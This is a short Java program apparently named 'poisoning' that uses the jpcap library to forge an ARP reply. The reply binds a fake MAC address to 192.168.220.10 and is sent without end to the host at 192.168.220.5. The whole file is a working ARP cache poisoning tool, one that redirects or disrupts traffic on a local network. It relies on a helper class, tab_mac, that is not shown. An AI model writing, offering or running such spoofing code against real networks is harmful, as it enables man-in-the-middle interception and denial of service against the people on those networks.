import java.io.BufferedReader;   
import java.io.IOException;   
import java.io.InputStreamReader;   
import jpcap.JpcapCaptor;   
import jpcap.JpcapSender;   
import jpcap.NetworkInterface;   
import jpcap.NetworkInterfaceAddress;   
import jpcap.packet.ARPPacket;   
import jpcap.packet.EthernetPacket;  
import java.net.InetAddress; 

public class poisoning{
 static NetworkInterface[] devices; 
  
  static JpcapSender sender;     
     
   static JpcapCaptor captor; 
    static EthernetPacket ether;   
          
      
       static String str;  

public static void main(String []args)
{
devices = JpcapCaptor.getDeviceList();  

 try   
    {   
         captor = JpcapCaptor.openDevice(devices[0], 65535, true, 3000); 
         
  
        captor.setFilter("arp",true);  
         byte[] mac_fake= new byte[] { (byte) 255, (byte)254 , (byte)253 , (byte)252, (byte)251 , (byte)250 };   
            byte[] srcip = new byte[] { (byte)192, (byte)168 , (byte)220 , (byte)10 }; 
              byte[] dip = new byte[] { (byte)192, (byte)168 , (byte)220 , (byte)5};   
           
             
            
                      ARPPacket    arp= new ARPPacket();   
   
                

                          arp.hardtype = ARPPacket.HARDTYPE_ETHER;   
              arp.prototype= ARPPacket.PROTOTYPE_IP;   
              arp.operation= ARPPacket.ARP_REPLY;   
              arp.hlen=6;   
              arp.plen=4;   
              arp.sender_hardaddr= mac_fake;   
              arp.sender_protoaddr= srcip;   
              arp.target_hardaddr= tab_mac.get_mac_byte("00:0c:29:98:b8:2d");   
              arp.target_protoaddr=dip;   
             ether= new EthernetPacket();   
             ether.frametype= EthernetPacket.ETHERTYPE_ARP;   
             ether.src_mac= devices[0].mac_address;   
             ether.dst_mac= tab_mac.get_mac_byte("00:0c:29:98:b8:2d");   
             arp.datalink= ether;   
             
             sender= captor.getJpcapSenderInstance();   
              while(true){
             System.out.println(arp.toString());
             sender.sendPacket(arp); }    
 
         }   
         catch(IOException e)   
          {   
           System.out.println( e.getMessage());   
           }   
   
          
     































}
}